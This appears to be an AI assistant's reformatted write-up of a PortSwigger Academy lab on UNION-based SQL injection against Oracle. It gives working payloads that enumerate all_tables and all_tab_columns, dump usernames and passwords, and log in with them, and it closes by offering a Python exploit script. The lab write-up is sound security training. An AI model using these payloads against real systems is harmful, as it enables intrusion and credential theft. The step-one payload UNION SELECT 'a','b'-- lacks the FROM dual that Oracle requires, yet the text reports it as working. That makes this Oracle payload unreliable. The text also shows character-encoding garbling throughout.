# SQL injection attack, listing the database contents on Oracle

Got it üëç I‚Äôll reformat your Oracle SQLi write-up into the **same structure and style** as your PostgreSQL example draft. Here‚Äôs the cleaned-up version:

---

# SQL injection attack, listing the database contents on Oracle databases

**Lab banner ‚Äì PortSwigger Practitioner level**

---

## Executive Summary

In the PortSwigger Web Security Academy lab *‚ÄúSQL injection attack: listing the database contents on Oracle databases‚Äù*, we demonstrated how an attacker can enumerate Oracle database tables, their columns, and sensitive user credentials using a series of UNION SELECT queries against the `all_tables` and `all_tab_columns` system views. Because the application concatenates user input directly into SQL statements without sanitisation, we pivoted from initial UNION tests to full schema enumeration and credential harvesting.

---

## Description

**Lab banner ‚Äì PortSwigger Practitioner level**

This lab challenges us to exploit a UNION-based SQL injection vulnerability in an Oracle database. By abusing Oracle‚Äôs metadata views, we were able to extract the names of database tables, enumerate columns of interest, and dump stored usernames and passwords.

---

## Why This Matters to You

* **Full data breach**: Oracle‚Äôs system views (`all_tables`, `all_tab_columns`) make schema enumeration straightforward once injection is possible.
* **Persistence risk**: Knowledge of table and column structures allows attackers to craft further malicious queries or establish backdoors.
* **Compliance violations**: Harvesting plaintext or weakly hashed credentials can trigger GDPR, CCPA, or equivalent reporting requirements.

---

## Step-by-Step Walk-Through

| # | What we did (payload URL-encoded where needed)                                                                                          | Intended SQL generated by the app                                                                                                 | What actually happens & why                                                     |
| - | --------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| 1 | Confirmed number and type of columns via UNION injection (2 columns, both strings).                                                     | `SELECT * FROM someTable WHERE category='X' UNION SELECT 'a','b'--`                                                               | Verified injection point and established query structure.                       |
| 2 | Enumerated tables with:<br>`' UNION SELECT table_name,NULL FROM all_tables--`                                                           | `SELECT * FROM someTable WHERE category='X' UNION SELECT table_name,NULL FROM all_tables--`                                       | Retrieved all table names. Identified `USERS_TOAEAL` as the target users table. |
| 3 | Enumerated columns for `USERS_TOAEAL` with:<br>`' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_TOAEAL'--` | `SELECT * FROM someTable WHERE category='X' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_TOAEAL'--` | Revealed sensitive columns `USERNAME_DINZLR` and `PASSWORD_BTNGGB`.             |
| 4 | Extracted credentials with:<br>`' UNION SELECT USERNAME_DINZLR,PASSWORD_BTNGGB FROM USERS_TOAEAL--`                                     | `SELECT * FROM someTable WHERE category='X' UNION SELECT USERNAME_DINZLR,PASSWORD_BTNGGB FROM USERS_TOAEAL--`                     | Retrieved full list of usernames and passwords.                                 |
| 5 | Logged in using harvested credentials.                                                                                                  | ‚Äî                                                                                                                                 | Administrative access granted, lab solved.                                      |

---

## Observable Output

| Test / Payload                                                                           | Visible Result                                 | What it Proved                       |
| ---------------------------------------------------------------------------------------- | ---------------------------------------------- | ------------------------------------ |
| `' UNION SELECT 'a','b'--`                                                               | Page rendered with injected values             | Confirmed 2-column structure.        |
| `' UNION SELECT table_name,NULL FROM all_tables--`                                       | List of Oracle system + custom tables          | Schema enumeration successful.       |
| `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_TOAEAL'--` | Displayed `USERNAME_DINZLR`, `PASSWORD_BTNGGB` | Sensitive column names identified.   |
| `' UNION SELECT USERNAME_DINZLR,PASSWORD_BTNGGB FROM USERS_TOAEAL--`                     | List of usernames and passwords                | Full credential disclosure achieved. |

---

## Conclusion

By leveraging UNION-based SQL injection against Oracle system views, we escalated from basic injection discovery to a full schema compromise, ultimately harvesting usernames and passwords. The lab highlights the risk of unsanitised SQL concatenation in Oracle environments.

**Mitigations**:

* Use parameterised queries (prepared statements) instead of string concatenation.
* Apply least-privilege roles to database users so applications cannot query metadata views.
* Enforce secure password storage (strong hashing, salting).

---

Would you like me to also **recreate the Python automation script (script.py)** in the same professional format for this Oracle lab write-up? That way, your walkthrough will look like a full pentest report + exploit code package.
